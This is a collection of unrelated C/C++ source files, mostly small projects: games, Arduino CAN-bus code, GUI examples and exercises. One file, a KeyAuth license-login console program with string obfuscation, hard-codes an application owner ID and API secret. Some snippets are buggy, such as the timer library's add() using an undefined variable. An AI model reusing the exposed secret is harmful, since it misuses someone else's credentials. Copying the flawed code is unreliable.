snake[i][1], 15, colors[YELLOW_GREEN]);\n\n    for (int i = snakelen - 1; i > 0; i--)\n    {\n\n        snake[i][0] = snake[i - 1][0];\n        snake[i][1] = snake[i - 1][1];\n    }\n    if ((direction == 'W'))\n    {\n        snake[0][1] += 10;\n    }\n    else if ((direction == 'A'))\n    {\n        snake[0][0] -= 10;\n    }\n    else if ((direction == 'S'))\n    {\n        snake[0][1] -= 10;\n    }\n    else if ((direction == 'D'))\n    {\n        snake[0][0] += 10;\n    }\n\n    for (int i = snakelen - 1; i > 0; i--)\n    {\n        snake[i][0] = snake[i - 1][0];\n        snake[i][1] = snake[i - 1][1];\n    }\n\n    //  DrawString( 50, 600, \"Here are some are basic shapes\", colors[MISTY_ROSE]); // this will print given string at x=50 , y=600\n    //  DrawString( 50, 570, \"You will use these to make your game\", colors[MISTY_ROSE]); // this will print given string at x=50 , y=570\n    //  DrawString(50, 570,\"Score:\",colors[MISTY_ROSE]); // this will print Score at x=50 , y=570\n    // DrawCircle(310, 405, 15, colors[YELLOW_GREEN]); // This will draw a circle at x=310,y=405 of radius 10\n\n    //                    v1( x,y )   v2( x,y )  , v3( x,y )\n    //  DrawTriangle(300,100,400,100,350,200,colors[MISTY_ROSE]);\n\n    // DrawLine(int x1, int y1, int x2, int y2, int lwidth, float *color)\n    //  DrawLine( 100,250,100,400,20,colors[MISTY_ROSE]);\n    DrawCircle(foodX + 5, foodY + 5, 5, colors[RED]);\n\n    // Draw the second food\n    DrawCircle(food2X + 5, food2Y + 5, 5, colors[BLUE]);\n\n    // Draw the snake\n    for (int i = 0; i < snakelen; i++)\n        DrawSquare(snake[i][0], snake[i]",
    "/**\n * \n *\n * Copyright (c) 2008-2009  All rights reserved.\n */\n\n#if ARDUINO>=100\n#include <Arduino.h> // Arduino 1.0\n#else\n#include <Wprogram.h> // Arduino 0022\n#endif\n#include <stdint.h>\n#include <avr/pgmspace.h>\n\n#include <stdio.h>\n#include <avr/io.h>\n#include <avr/interrupt.h>\n#include <util/delay.h>\n#include \"pins_arduino.h\"\n#include <inttypes.h>\n#include \"global.h\"\n#include \"mcp2515.h\"\n#include \"defaults.h\"\n#include \"Canbus.h\"\n\n\n\n\n/* C++ wrapper */\nCanbusClass::CanbusClass() {\n\n \n}\nchar CanbusClass::message_rx(unsigned char *buffer) {\n\t\ttCAN message;\n\t\n\t\tif (mcp2515_check_message()) {\n\t\t\n\t\t\t\n\t\t\t// Lese die Nachricht aus dem Puffern des MCP2515\n\t\t\tif (mcp2515_get_message(&message)) {\n\t\t\t//\tprint_can_message(&message);\n\t\t\t//\tPRINT(\"\\n\");\n\t\t\t\tbuffer[0] = message.data[0];\n\t\t\t\tbuffer[1] = message.data[1];\n\t\t\t\tbuffer[2] = message.data[2];\n\t\t\t\tbuffer[3] = message.data[3];\n\t\t\t\tbuffer[4] = message.data[4];\n\t\t\t\tbuffer[5] = message.data[5];\n\t\t\t\tbuffer[6] = message.data[6];\n\t\t\t\tbuffer[7] = message.data[7];\t\t\t\t\t\t\t\t\n//\t\t\t\tbuffer[] = message[];\n//\t\t\t\tbuffer[] = message[];\n//\t\t\t\tbuffer[] = message[];\n//\t\t\t\tbuffer[] = message[];\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t}\n\t\t\telse {\n\t\t\t//\tPRINT(\"Kann die Nachricht nicht auslesen\\n\\n\");\n\t\t\t}\n\t\t}\n\n}\n\nchar CanbusClass::message_tx(void) {\n\ttCAN message;\n\n\n\t// einige Testwerte\n\tmessage.id = 0x7DF;\n\tmessage.header.rtr = 0;\n\tmessage.header.length = 8;\n\tmessage.data[0] = 0x02;\n\tmessage.data[1] = 0x01;\n\tmessage.data[2] = 0x05;\n\tmessage.data[3] = 0x00;\n\tmessage.data[4] = 0x00;\n\tmessage.data[5] = 0x00;\n\tmessage.data[6] = 0x00;\n\tmessage.data[7] = 0x00;\t\t\t\t\t\t\n\t\n\t\n\t\n\t\n//\tmcp2515_bit_modify(CANCTRL, (1<<REQOP2)|(1<<REQOP1)|(1<<REQOP0), (1<<REQOP1));\t\n\t\tmcp2515_bit_modify(CANCTRL, (1<<REQOP2)|(1<<REQOP1)|(1<<REQOP0), 0);\n\t\t\n\tif (mcp2515_send_message(&message)) {\n\t\t//\tSET(LED2_HIGH);\n\t\treturn 1;\n\t\n\t}\n\telse {\n\t//\tPRINT(\"Fehler: konnte die Nachricht nicht auslesen\\n\\n\");\n\treturn 0;\n\t}\nreturn 1;\n \n}\n\nchar CanbusClass::ecu_req(unsigned char pid,  char *buffer) \n{\n\ttCAN message;\n\tfloat engine_data;\n\tint timeout = 0;\n\tchar message_ok = 0;\n\t// Prepair message\n\tmessage.id = PID_REQUEST;\n\tmessage.header.rtr = 0;\n\tmessage.header.length = 8;\n\tmessage.data[0] = 0x02;\n\tmessage.data[1] = 0x01;\n\tmessage.data[2] = pid;\n\tmessage.data[3] = 0x00;\n\tmessage.data[4] = 0x00;\n\tmessage.data[5] = 0x00;\n\tmessage.data[6] = 0x00;\n\tmessage.data[7] = 0x00;\t\t\t\t\t\t\n\t\n\n\tmcp2515_bit_modify(CANCTRL, (1<<REQOP2)|(1<<REQOP1)|(1<<REQOP0), 0);\n\t\n\tif (mcp2515_send_message(&message)) {\n\t}\n\t\t\t\tif (mcp2515_check_message()) \n\t\t\t\t{\n\n\t\t\t\t\tif (mcp2515_get_message(&message)) \n\t\t\t\t\t{\n\t\t\t\t\t\t\tswitch(message.data[2])\n\t\t\t\t\t\t\t\t{   /* Details from http://en.wikipedia.org/wiki/OBD-II_PIDs */\n\t\t\t\t\t\t\t\t\tcase ENGINE_RPM:  \t\t\t//   ((A*256)+B)/4    [RPM]\n\t\t\t\t\t\t\t\t\tengine_data =  ((message.data[3]*256) + message.data[4])/4;\n\t\t\t\t\t\t\t\t\tsprintf(buffer,\"%d rpm \",(int) engine_data);\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tcase ENGINE_COOLANT_TEMP: \t// \tA-40\t\t\t  [degree C]\n\t\t\t\t\t\t\t\t\tengine_data =  message.data[3] - 40;\n\t\t\t\t\t\t\t\t\tsprintf(buffer,\"%d degC\",(int) engine_data);\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tcase VEHICLE_SPEED: \t\t// A\t\t\t\t  [km]\n\t\t\t\t\t\t\t\t\tengine_data =  message.data[3];\n\t\t\t\t\t\t\t\t\tsprintf(buffer,\"%d km \",(int) engine_data);\n\t\t\t\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t\t\t\t\tcase MAF_SENSOR:   \t\t\t// ((256*A)+B) / 100  [g/s]\n\t\t\t\t\t\t\t\t\tengine_data =  ((message.data[3]*256) + message.data[4])/100;\n\t\t\t\t\t\t\t\t\tsprintf(buffer,\"%d g/s\",(int) engine_data);\n\t\t\t\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t\t\t\t\tcase O2_VOLTAGE:    \t\t// A * 0.005   (B-128) * 100/128 (if B==0xFF, sensor is not used in trim calc)\n\t\t\t\t\t\t\t\t\tengine_data = message.data[3]*0.005;\n\t\t\t\t\t\t\t\t\tsprintf(buffer,\"%d V\",(int) engine_data);\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tcase THROTTLE:\t\t\t\t// Throttle Position\n\t\t\t\t\t\t\t\t\tengine_data = (message.data[3]*100)/255;\n\t\t\t\t\t\t\t\t\tsprintf(buffer,\"%d %% \",(int) engine_data);\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\n}\n\n\n\n\n\n\nchar CanbusClass::init(unsigned char speed) {\n\n  return mcp2515_init(speed);\n \n}\n\nCanbusClass Canbus;\n",
    "#include \"stdafx.h\"\r\n#include \"sudoku_generating.h\"  \r\n#include \"stdlib.h\"\r\n#include \"time.h\"\r\n\r\n\r\n\r\nbool isSafe(int grid[SIZE][SIZE], int row, int col, int num) {\r\n\tfor (int x = 0; x < SIZE; x++) {\r\n\t\tif (grid[row][x] == num || grid[x][col] == num)\r\n\t\t\treturn false;\r\n\t}\r\n\tint startRow = row - row % 3, startCol = col - col % 3;\r\n\tfor (int i = 0; i < 3; i++) {\r\n\t\tfor (int j = 0; j < 3; j++) {\r\n\t\t\tif (grid[i + startRow][j + startCol] == num)\r\n\t\t\t\treturn false;\r\n\t\t}\r\n\t}\r\n\treturn true;\r\n}\r\n\r\nbool fillGrid(int grid[SIZE][SIZE]) {\r\n\tint row, col;\r\n\tif (!findEmptyLocation(grid, row, col))\r\n\t\treturn true; // Success!\r\n\tint i;\r\n\tint num;\r\n\tint numbers[9] = { 1, 2, 3, 4, 5, 6, 7, 8, 9 };\r\n\r\n\tfor (i = 0; i < 9; i++)\r\n\t{\r\n\t\tnumbers[i] = 1 + rand() % 9;\r\n\t}\r\n\r\n\tfor (i = 0; i < 9; i++) {\r\n\t\tnum = numbers[i];\r\n\t\tif (isSafe(grid, row, col, num)) {\r\n\t\t\tgrid[row][col] = num;\r\n\t\t\tif (fillGrid(grid))\r\n\t\t\t\treturn true;\r\n\t\t\tgrid[row][col] = 0;\r\n\t\t}\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nbool findEmptyLocation(int grid[SIZE][SIZE], int &row, int &col) {\r\n\tfor (row = 0; row < SIZE; row++) {\r\n\t\tfor (col = 0; col < SIZE; col++) {\r\n\t\t\tif (grid[row][col] == 0)\r\n\t\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nvoid hideNumbers(int grid[SIZE][SIZE], int minHidden, int maxHidden) {\r\n\tint count = minHidden + rand() % (maxHidden - minHidden + 1);\r\n\twhile (count > 0) {\r\n\t\tint row = rand() % SIZE;\r\n\t\tint col = rand() % SIZE;\r\n\t\tif (grid[row][col] != 0) {\r\n\t\t\tgrid[row][col] = 0;\r\n\t\t\tcount--;\r\n\t\t}\r\n\t}\r\n}",
    "// Dear ImGui: standalone example application for SDL3 + SDL_Renderer\n// (SDL is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan/Metal graphics context creation, etc.)\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// Important to understand: SDL_Renderer is an _optional_ component of SDL3.\n// For a multi-platform app consider using e.g. SDL+DirectX on Windows and SDL+OpenGL on Linux/OSX.\n\n#include \"imgui.h\"\n#include \"imgui_impl_sdl3.h\"\n#include \"imgui_impl_sdlrenderer3.h\"\n#include <stdio.h>\n#include <SDL3/SDL.h>\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n#include <SDL3/SDL_opengles2.h>\n#else\n#include <SDL3/SDL_opengl.h>\n#endif\n\n// Main code\nint main(int, char**)\n{\n    // Setup SDL\n    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_TIMER | SDL_INIT_GAMEPAD) != 0)\n    {\n        printf(\"Error: SDL_Init(): %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    // Enable native IME.\n    SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");\n\n    // Create window with SDL_Renderer graphics context\n    Uint32 window_flags = SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_HIDDEN;\n    SDL_Window* window = SDL_CreateWindow(\"Dear ImGui SDL3+SDL_Renderer example\", 1280, 720, window_flags);\n    if (window == nullptr)\n    {\n        printf(\"Error: SDL_CreateWindow(): %s\\n\", SDL_GetError());\n        return -1;\n    }\n    SDL_Renderer* renderer = SDL_CreateRenderer(window, nullptr);\n    SDL_SetRenderVSync(renderer, 1);\n    if (renderer == nullptr)\n    {\n        SDL_Log(\"Error: SDL_CreateRenderer(): %s\\n\", SDL_GetError());\n        return -1;\n    }\n    SDL_SetWindowPosition(window, SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED);\n    SDL_ShowWindow(window);\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsLight();\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplSDL3_InitForSDLRenderer(window, renderer);\n    ImGui_ImplSDLRenderer3_Init(renderer);\n\n    // Load Fonts\n    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.\n    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.\n    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).\n    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.\n    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.\n    // - Read 'docs/FONTS.md' for more instructions and details.\n    // - Remember that in C/C++ if you want to include a backslash \\ in a string literal you need to write a double backslash \\\\ !\n    // - Our Emscripten build process allows embedding fonts to be accessible at runtime from the \"fonts/\" folder. See Makefile.emscripten for details.\n    //io.Fonts->AddFontDefault();\n    //io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\segoeui.ttf\", 18.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/DroidSans.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Roboto-Medium.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Cousine-Regular.ttf\", 15.0f);\n    //ImFont* font = io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\ArialUni.ttf\", 18.0f, nullptr, io.Fonts->GetGlyphRangesJapanese());\n    //IM_ASSERT(font != nullptr);\n\n    // Our state\n    bool show_demo_window = true;\n    bool show_another_window = false;\n    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);\n\n    // Main loop\n    bool done = false;\n#ifdef __EMSCRIPTEN__\n    // For an Emscripten build we are disabling file-system access, so let's not attempt to do a fopen() of the imgui.ini file.\n    // You may manually call LoadIniSettingsFromMemory() to load settings from your own storage.\n    io.IniFilename = nullptr;\n    EMSCRIPTEN_MAINLOOP_BEGIN\n#else\n    while (!done)\n#endif\n    {\n        // Poll and handle events (inputs, window resize, etc.)\n        // You can read the io.WantCaptureMouse, io.WantCaptureKeyboard flags to tell if dear imgui wants to use your inputs.\n        // - When io.WantCaptureMouse is true, do not dispatch mouse input data to your main application, or clear/overwrite your copy of the m",
    "#include \"staffwindow.h\"\r\n#include \"ui_staffwindow.h\"\r\n\r\nstaffWindow::staffWindow(QString user,QString login,QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::staffWindow)\r\n    , cUser(user)\r\n    , cLogin(login)\r\n{\r\n    ui->setupUi(this);\r\n    ui->current_user->setText(cUser);\r\n    ui->login_as->setText(cLogin);\r\n    QPixmap logout(\":/rsc/img/logout2.png\");\r\n    QIcon icon(logout);\r\n    ui->sign_out->setIcon(icon);\r\n    //ui->sign_out->setToolTip(\"sign out\");\r\n}\r\n\r\nstaffWindow::~staffWindow()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid staffWindow::on_pushButton_1_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(0);\r\n}\r\n\r\n\r\nvoid staffWindow::on_pushButton_2_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(1);\r\n}\r\n\r\nvoid staffWindow::on_pushButton_3_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(2);\r\n}\r\n\r\nvoid staffWindow::on_pushButton_4_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(3);\r\n}\r\n\r\nvoid staffWindow::on_pushButton_5_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(4);\r\n}\r\n",
    "#include <Windows.h>\n#include \"auth.hpp\"\n#include <string>\n#include \"utils.hpp\"\n#include <iostream>\n#include <cstdlib> // For system function\n#include <string>\n#include <windows.h>\n#include <chrono> // For std::chrono\n#include <thread> // For std::this_thread::sleep_for\n#include \"skStr.h\"\n#include \"xorstr.h\"\n#include <random>\n#\n\n\n\n\nint closeProcess();\nstd::string generateRandomNumber() {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_int_distribution<> dis(1000, 9999); // Adjust the range as needed\n    return std::to_string(dis(gen));\n}\n\n\n\n\n\nstd::string tm_to_readable_time(tm ctx);\nstatic std::time_t string_to_timet(std::string timestamp);\nstatic std::tm timet_to_tm(time_t timestamp);\nconst std::string compilation_date = (std::string)skCrypt(__DATE__);\nconst std::string compilation_time = (std::string)skCrypt(__TIME__);\n\nstruct slowly_printing_string {\n    std::string data;\n    long int delay;\n};\n\nstd::ostream& operator<<(std::ostream& out, const slowly_printing_string& s) {\n    for (const auto& c : s.data) {\n        out << c << std::flush;\n        std::this_thread::sleep_for(std::chrono::milliseconds(s.delay));\n    }\n    return out;\n}\n\n\nusing namespace KeyAuth;\n\nauto name = skCrypt(\"site\");\nauto ownerid = skCrypt(\"Ng7Ai0kQ3o\");\nauto secret = skCrypt(\"9a92cc656269d322f37663e6d3e3aa3fa19676f17c9fdbe578c8ac0fe1f0194a\");\nauto version = skCrypt(\"1.0\");\nauto url = skCrypt(\"https://keyauth.win/api/1.2/\"); // change if you're self-hosting\n\napi KeyAuthApp(name.decrypt(), ownerid.decrypt(), secret.decrypt(), version.decrypt(), url.decrypt());\n\nvoid updateConsoleTitle() {\n    while (true) {\n\n        // Generate random title\n        std::string randomNumber = generateRandomNumber();\n        std::string title = \"made by boxakos //\" + randomNumber + \"\";\n\n        // Set console title\n        SetConsoleTitleA(title.c_str());\n\n        // Sleep for 1 millisecond before updating again\n        std::this_thread::sleep_for(std::chrono::milliseconds(1));\n    }\n}\n\nint main()\n{\n\n\n\n    int option;\n\n    std::thread titleThread(updateConsoleTitle);\n\n    name.clear(); ownerid.clear(); secret.clear(); version.clear(); url.clear();\n\n    system(\"color 5\");\n    std::cout << slowly_printing_string{ E(\"Connecting...\").decrypt(), 60 };\n    system(\"cls\");\n    system(\"color f \");\n    KeyAuthApp.init();\n    if (!KeyAuthApp.data.success)\n    {\n        std::cout << skCrypt(\"\\n Status: \") << KeyAuthApp.data.message;\n        Sleep(1500);\n        exit(1);\n    }\n\n    if (std::filesystem::exists(\"scylla.json\")) //change test.txt to the path of your file :smile:\n    {\n        if (!CheckIfJsonKeyExists(\"scylla.json\", \"username\"))\n        {\n            std::string key = ReadFromJson(\"scylla.json\", \"license\");\n            KeyAuthApp.license(key);\n            if (!KeyAuthApp.data.success)\n            {\n                std::remove(\"scylla.json\");\n                std::cout << skCrypt(\"\\n Status: \") << KeyAuthApp.data.message;\n                Sleep(1500);\n                exit(1);\n            }\n            std::cout << skCrypt(\"\\n\\n Successfully Automatically Logged In\\n\");\n        }\n        else\n        {\n            std::string username = ReadFromJson(\"scylla.json\", \"username\");\n            std::string password = ReadFromJson(\"scylla.json\", \"password\");\n            KeyAuthApp.login(username, password);\n            if (!KeyAuthApp.data.success)\n            {\n                std::remove(\"scylla.json\");\n                std::cout << skCrypt(\"\\n Status: \") << KeyAuthApp.data.message;\n                Sleep(1500);\n                exit(1);\n            }\n            std::cout << skCrypt(\"\\n\\n Successfully Automatically Logged In\\n\");\n        }\n    }\n    else\n    {\n        std::cout << skCrypt(\"\\n\\n [1] Login\\n [2] Register\\n\\n Choose option: \");\n\n        int option;\n        std::string username;\n        std::string password;\n        std::string key;\n\n        std::cin >> option;\n        switch (option)\n        {\n        case 1:\n            std::cout << skCrypt(\"\\n\\n Enter username: \");\n            std::cin >> username;\n            std::cout << skCrypt(\"\\n Enter password: \");\n            std::cin >> password;\n            KeyAuthApp.login(username, password);\n            break;\n        case 2:\n            std::cout << skCrypt(\"\\n\\n Enter username: \");\n            std::cin >> username;\n            std::cout << skCrypt(\"\\n Enter password: \");\n            std::cin >> password;\n            std::cout << skCrypt(\"\\n Enter license: \");\n            std::cin >> key;\n            KeyAuthApp.regstr(username, password, key);\n            break;\n        default:\n            std::cout << skCrypt(\"\\n\\n Status: Failure: Invalid Selection\");\n            Sleep(3000);\n            exit(1);\n        }\n\n        if (!KeyAuthApp.data.success)\n        {\n            std::cout << skCrypt(\"\\n Status: \") << KeyAuthApp.data.message;\n            Sleep(1500);\n            exit(1);\n        }\n        if (username.empty() || password.empty()) \n        {\n            WriteToJson(\"scyll",
    "/**\n * \\class uTimerBrokerLib\n * \\brief Broker library for uTimerLib\n *\n * Adds multiple timed functions support to uTimerLib\n *\n * Decreases resolution to miliseconds\n *\n * Library depends on uTimerLib library, https://github.com/Naguissa/uTimerLib\n *\n * @see <a href=\"https://github.com/Naguissa/uTimerBrokerLib\">https://github.com/Naguissa/uTimerBrokerLib</a>\n * @see <a href=\"https://github.com/Naguissa/uTimerLib\">https://github.com/Naguissa/uTimerLib</a> - Needed dependecy\n * @see <a href=\"mailto:naguissa@foroelectro.net\">naguissa@foroelectro.net</a>\n * @version 1.0.0\n */\n#include <Arduino.h>\n#include \"uTimerBrokerLib.h\"\n\n/**\n * \\brief Static variable assignment to NULL\n */\nuTimerBrokerLib * uTimerBrokerLib::_instance = NULL;\n\n\n\nuTimerBrokerLib::uTimerBrokerLib() {\n    // zerofill control array\n    for (uint8_t i = 0; i < UTIMERBROKERLIB_MAXHOOKS; i++) {\n        _intervals[i] = 0;\n    }\n\tTimerLib.setInterval_us(uTimerBrokerLib::interrupt, 1000);\n}\n\n/**\n * \\brief Class initialization\n * @return true if correct, false if already init.\n */\nuTimerBrokerLib* uTimerBrokerLib::init() {\n\textern uTimerLib TimerLib;\n\tif (_instance == NULL) {\n\t\t_instance = uTimerBrokerLib();\n\t\treturn _instance;\n\t}\n\treturn null;\n}\n\n\n/**\n * \\brief Sets a function in a given slot\n *\n * @param userfunction function pointer to be called\n * @param slot position where to store \n * @param ms period of function call, in miliseconds\n * @return slot where function is placed. Useful to clear or overwrite it. UTIMERBROKERLIB_ERROR if slot > space\n */\nuint8_t uTimerBrokerLib::set(const void *userfunction, const uint8_t slot, const uint32_t ms) {\n    if (slot < UTIMERBROKERLIB_MAXHOOKS) {\n        _intervals[slot] = ms;\n        _left[slot] = ms;\n        _functions[slot] = userfunction;\n        return slot;\n    }\n    return UTIMERBROKERLIB_ERROR;\n}\n\n/**\n * \\brief Adds a function in 1st available slot\n *\n * @param userfunction function pointer to be called\n * @param ms period of function call, in miliseconds\n * @return slot where function is placed. Useful to clear or overwrite it. UTIMERBROKERLIB_ERROR if no space available\n */\nuint8_t uTimerBrokerLib::add(const void *userfunction, const uint32_t ms) {\n    for (uint8_t i = 0; i < UTIMERBROKERLIB_MAXHOOKS; i++) {\n        if (_intervals[i] == 0) {\n            _intervals[slot] = ms;\n            _left[slot] = ms;\n            _functions[slot] = userfunction;\n            return i;\n        }\n    }\n    return UTIMERBROKERLIB_ERROR;\n}\n\n/**\n * \\brief Clears a given slot\n *\n * @return Slot cleared. UTIMERBROKERLIB_ERROR if not found\n */\nuint8_t uTimerBrokerLib::clear(const uint8_t slot) {\n    if (slot < UTIMERBROKERLIB_MAXHOOKS) {\n        _intervals[slot] = 0;\n        return slot;\n    }\n    return UTIMERBROKERLIB_ERROR;\n}\n\n\n/**\n * \\brief Removes 1s appearance of give function from slots\n *\n * @param userfunction function pointer to be called\n * @return Slot cleared. UTIMERBROKERLIB_ERROR if not found\n */\nuint8_t uTimerBrokerLib::clear(const void *userfunction) {\n    for (uint8_t i = 0; i < UTIMERBROKERLIB_MAXHOOKS; i++) {\n        if (_intervals[i] > 0 && _functions[i] == userfunction) {\n            _intervals[i] = 0;\n            return i;\n        }\n    }\n    return UTIMERBROKERLIB_ERROR;\n}\n\n/**\n * \\brief Main public interrupt loop\n *\n * Calls private loop\n */\n\nvoid uTimerBrokerLib::interrupt() {\n\t_instance->_interrupt();\n}\n\n\n\n/**\n * \\brief Main private interrupt loop\n *\n * Checks and decrements all active functions\n */\nvoid uTimerBrokerLib::_interrupt(void) {\n    for (uint8_t i = 0; i < UTIMERBROKERLIB_MAXHOOKS; i++) {\n        if (_intervals[i] > 0) {\n            if (--_left[i] == 0) {\n                _left[i] = _intervals[i];\n                _functions[i]();\n            }\n        }\n    }\n}\n\n\n/**\n * \\brief Preinstantiate Object\n *\n * Now you can use al functionality calling TimerBrokerLib.function\n */\nuTimerBrokerLib TimerBrokerLib = uTimerBrokerLib();\n\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"allen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n// Definition for a binary tree node.\r\nstruct TreeNode {\r\n    int val;\r\n    TreeNode *left;\r\n    TreeNode *right;\r\n    TreeNode() : val(0), left(nullptr), right(nullptr) {}\r\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\r\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}\r\n};\r\n\r\nclass Solution {\r\npublic:\r\n    bool isSameTree(TreeNode* p, TreeNode* q) {\r\n        if (p == NULL && q == NULL)\r\n            return true;\r\n        if (p == NULL || q == NULL)\r\n            return false;\r\n        if (p->val != q->val)\r\n            return false;\r\n        return isSameTree(p->left, q->left) && isSameTree(p->right, q->right);\r\n    }\r\n};\r\n\r\n// Helper function to create a new TreeNode\r\nTreeNode* newNode(int data) {\r\n    TreeNode* node = new TreeNode(data);\r\n    node->left = node->right = NULL;\r\n    return node;\r\n}\r\n\r\n// Main function to test the isSameTree function\r\nint main() {\r\n    Solution solution;\r\n\r\n    // Creating test trees:\r\n    // Tree 1:\r\n    //     1\r\n    //    / \\\r\n    //   2   3\r\n    TreeNode* tree1 = new TreeNode(1);\r\n    tree1->left = new TreeNode(2);\r\n    tree1->right = new TreeNode(3);\r\n\r\n    // Tree 2:\r\n    //     1\r\n    //    / \\\r\n    //   2   3\r\n    TreeNode* tree2 = new TreeNode(1);\r\n    tree2->left = new TreeNode(2);\r\n    tree2->right = new TreeNode(3);\r\n\r\n    // Tree 3 (different structure):\r\n    //     1\r\n    //    / \\\r\n    //   2   4\r\n    TreeNode* tree3 = new TreeNode(1);\r\n    tree3->left = new TreeNode(2);\r\n    tree3->right = new TreeNode(4);\r\n\r\n    // Testing if tree1 and tree2 are the same\r\n    bool result1 = solution.isSameTree(tree1, tree2);\r\n    cout << \"Tree 1 and Tree 2 are \" << (result1 ? \"the same\" : \"different\") << \".\" << endl;\r\n\r\n    // Testing if tree1 and tree3 are the same\r\n    bool result2 = solution.isSameTree(tree1, tree3);\r\n    cout << \"Tree 1 and Tree 3 are \" << (result2 ? \"the same\" : \"different\") << \".\" << endl;\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <iostream>\n#include <stdio.h>\n#include <cstdlib>\n#include <vector>\n#include <algorithm>\n#include <map>\n#include <limits>\n#include <unistd.h>\n\n#include \"Eigen/Dense\"\n#include \"Eigen/Sparse\"\n#include \"Eigen/src/Core/Matrix.h\"\n\n#include \"Simplex.h\"\n#include \"GS.h\"\n#include \"Data.h\"\n\nusing namespace std;\n\ndouble pInf = numeric_limits<double>::infinity();\ndouble nInf = -numeric_limits<double>::infinity();\ndouble EPSILON_1 = 1e-5;\n\nint main(int argc, char **argv)\n{\n  // int seed = std::atoi(argv[2]);\n  // srand(seed);\n  // int n = std::atoi(argv[1]);\n\n  // MatrixXd A(2, 4);\n  // A.row(0) << 2, 1, 1, 0;\n  // A.row(1) << 1, 3, 0, 1;\n\n  // VectorXd b(2);\n  // b << 2, 3;\n\n  // VectorXd c(4);\n  // c << 1, 1, 0, 0;\n\n  // VectorXd u(4);\n  // u << pInf, pInf, pInf, pInf;\n\n  // VectorXd l(4);\n  // l << 0, 0, 0, 0;\n\n  // vector<int> B = {2, 3};\n 